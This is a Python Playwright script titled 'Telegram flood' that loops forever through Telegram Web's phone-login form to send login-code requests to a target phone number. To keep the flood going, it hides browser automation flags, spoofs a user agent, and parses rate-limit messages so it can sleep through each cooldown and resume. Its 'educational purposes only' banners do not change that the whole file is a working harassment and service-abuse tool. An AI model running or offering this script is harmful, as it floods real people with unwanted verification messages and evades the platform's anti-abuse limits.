#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
TELEGRAM FLOOD – OPTIMIZED REFRESH TIMING (INFINITE + COOLDOWN)
- Clicks "Log in by phone number"
- Fills phone number
- Clicks "Next" with a DELAY to let the request process
- Waits for network response (or a fixed 3-4 seconds)
- Refreshes and repeats
- DETECTS "too many attempts" and waits the required time
- EDUCATIONAL USE ONLY – DO NOT USE WITHOUT PERMISSION.
"""

import asyncio
import sys
import re
import logging
from playwright.async_api import async_playwright, TimeoutError as PlaywrightTimeoutError

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

async def perform_login_flow(page, phone_number: str) -> tuple:
    """
    Performs the login flow with proper timing.
    Returns: (success, cooldown_seconds)
    - success: True if code was sent, False otherwise
    - cooldown_seconds: 0 if no cooldown, otherwise seconds to wait
    """
    try:
        # STEP 1: Click "Log in by phone number" button
        logger.info("🔍 Clicking 'Log in by phone number'...")
        
        phone_login_btn = await page.wait_for_selector(
            "button.Button.auth-button.default.primary.text:has-text('Log in by phone number')",
            timeout=10000
        )
        
        if not phone_login_btn:
            phone_login_btn = await page.wait_for_selector(
                "button.auth-button.primary.text",
                timeout=5000
            )
        
        if phone_login_btn:
            await phone_login_btn.click()
            await page.wait_for_timeout(1500)
            logger.info("✅ Clicked phone login button")
        else:
            logger.error("❌ Phone login button not found")
            return False, 0
        
        # STEP 2: Find and fill phone input
        logger.info("📞 Looking for phone input...")
        
        phone_input = await page.wait_for_selector(
            "input#sign-in-phone-number",
            timeout=10000
        )
        
        if not phone_input:
            phone_input = await page.wait_for_selector(
                "input.form-control[type='text'][inputmode='tel']",
                timeout=5000
            )
        
        if not phone_input:
            logger.error("❌ Phone input not found")
            return False, 0
        
        # Clear and fill
        await phone_input.click()
        await phone_input.fill("")
        await page.wait_for_timeout(300)
        await phone_input.fill(phone_number)
        logger.info(f"✅ Entered phone number: {phone_number}")
        
        # STEP 3: Click "Next" button with network monitoring
        logger.info("▶️ Clicking 'Next' and waiting for request to complete...")
        
        # Set up a promise to wait for the /api/send_code network request
        request_completed = asyncio.Future()
        request_status = None
        
        async def on_response(response):
            nonlocal request_status
            if "/api/send_code" in response.url:
                logger.info(f"📡 Network request detected: {response.status}")
                request_status = response.status
                if response.status in (200, 302):
                    request_completed.set_result(True)
                else:
                    request_completed.set_result(False)
        
        page.on("response", on_response)
        
        # Click Next
        next_btn = await page.wait_for_selector(
            "button.Button.auth-button.default.primary:has-text('Next')",
            timeout=5000
        )
        
        if not next_btn:
            next_btn = await page.wait_for_selector(
                "button[type='submit']",
                timeout=3000
            )
        
        if next_btn:
            await next_btn.click()
            logger.info("✅ Clicked Next – waiting for server response...")
        else:
            await page.keyboard.press("Enter")
            logger.info("ℹ️ Pressed Enter instead")
        
        # Wait for the network request to complete (max 5 seconds)
        try:
            await asyncio.wait_for(request_completed, timeout=5.0)
            logger.info("✅ Server acknowledged the request – code was sent!")
            return True, 0
        except asyncio.TimeoutError:
            logger.warning("⚠️ No network response detected – checking for error messages...")
            
            # Wait a bit for error messages to appear
            await page.wait_for_timeout(2000)
            
            # Check for "too many attempts" error
            error_text = await page.evaluate("""
                () => {
                    const errors = document.querySelectorAll('.error-message, .alert-danger, div[class*="error"]');
                    for (let el of errors) {
                        if (el.textContent) return el.textContent;
                    }
                    // Also check for toast notifications
                    const toasts = document.querySelectorAll('.toast, .notification');
                    for (let el of toasts) {
                        if (el.textContent) return el.textContent;
                    }
                    return null;
                }
            """)
            
            if error_text:
                logger.warning(f"⚠️ Error message: {error_text}")
                # Try to extract cooldown time from error message
                # Matches: "try again in 2 minutes", "in 5 seconds", etc.
                cooldown_match = re.search(r'in\s+(\d+)\s+(second|minute|hour)', error_text, re.IGNORECASE)
                if cooldown_match:
                    amount = int(cooldown_match.group(1))
                    unit = cooldown_match.group(2).lower()
                    if 'minute' in unit:
                        cooldown_seconds = amount * 60
                    elif 'hour' in unit:
                        cooldown_seconds = amount * 3600
                    else:
                        cooldown_seconds = amount
                    logger.info(f"⏳ Cooldown detected: {amount} {unit}(s) = {cooldown_seconds} seconds")
                    return False, cooldown_seconds
                elif "too many" in error_text.lower() or "try again" in error_text.lower():
                    # Default cooldown for "too many attempts"
                    logger.info("⏳ Cooldown detected (default): 2 minutes")
                    return False, 120
                else:
                    return False, 0
            
            # If no error, assume it worked
            logger.info("ℹ️ No error detected – assuming code was sent")
            return True, 0
            
    except Exception as e:
        logger.error(f"❌ Flow failed: {e}")
        return False, 0

async def main_async(phone_number: str):
    logger.info("=== TELEGRAM FLOOD – INFINITE + COOLDOWN DETECTION ===")
    logger.info(f"Target phone: {phone_number}")
    logger.warning("⚠️  This will send REAL login requests. Use responsibly.\n")
    
    async with async_playwright() as p:
        browser = await p.chromium.launch(
            headless=False,
            args=[
                '--disable-blink-features=AutomationControlled',
                '--no-sandbox',
                '--disable-dev-shm-usage'
            ]
        )
        context = await browser.new_context(
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            viewport={"width": 1280, "height": 720}
        )
        page = await context.new_page()
        
        success_count = 0
        fail_count = 0
        attempt = 0
        
        # INFINITE LOOP – runs until you press Ctrl+C
        while True:
            attempt += 1
            logger.info(f"\n{'='*50}")
            logger.info(f"🔄 ATTEMPT {attempt} – Successes: {success_count}, Fails: {fail_count}")
            logger.info(f"{'='*50}")
            
            # Navigate to Telegram Web
            logger.info("🌐 Navigating to Telegram Web...")
            await page.goto(
                "https://web.telegram.org/a/",
                wait_until="domcontentloaded",
                timeout=15000
            )
            await page.wait_for_timeout(3000)  # Let page settle
            
            # Perform the login flow
            success, cooldown = await perform_login_flow(page, phone_number)
            
            if success:
                success_count += 1
                logger.info(f"✅ Attempt {attempt} – code sent! (Total: {success_count})")
            else:
                fail_count += 1
                logger.warning(f"⚠️ Attempt {attempt} failed (Total fails: {fail_count})")
                
                # If we got a cooldown, wait it out
                if cooldown > 0:
                    logger.info(f"⏳ Waiting {cooldown} seconds before next attempt...")
                    await asyncio.sleep(cooldown)
                    # After waiting, refresh and continue
                    logger.info("🔄 Refreshing page after cooldown...")
                    await page.reload(wait_until="domcontentloaded")
                    await page.wait_for_timeout(2000)
                    continue
            
            # Wait and refresh for next attempt
            logger.info(f"⏳ Waiting 3 seconds before refresh...")
            await page.wait_for_timeout(3000)
            
            # Refresh the page
            logger.info("🔄 Refreshing page for next attempt...")
            await page.reload(wait_until="domcontentloaded")
            await page.wait_for_timeout(2000)

if __name__ == "__main__":
    print("\n" + "="*60)
    print("⚠️  WARNING: This script is for EDUCATIONAL PURPOSES ONLY.")
    print("⚖️  Using it against any phone number without EXPLICIT CONSENT is ILLEGAL.")
    print("📞  Always test with your OWN number or a sandbox environment.")
    print("🔄  This script runs FOREVER – press Ctrl+C to stop.")
    print("⏳  Automatically waits when 'too many attempts' is detected.")
    print("="*60 + "\n")
    
    if len(sys.argv) < 2:
        print("Usage: py tg_flood_cooldown.py +16049773717")
        sys.exit(1)
    
    phone_arg = sys.argv[1].strip()
    if not phone_arg.startswith('+') or not phone_arg[1:].isdigit():
        print(f"❌ Invalid phone number: {phone_arg}")
        sys.exit(1)
    
    try:
        asyncio.run(main_async(phone_arg))
    except KeyboardInterrupt:
        print("\n🛑 Stopped by user.")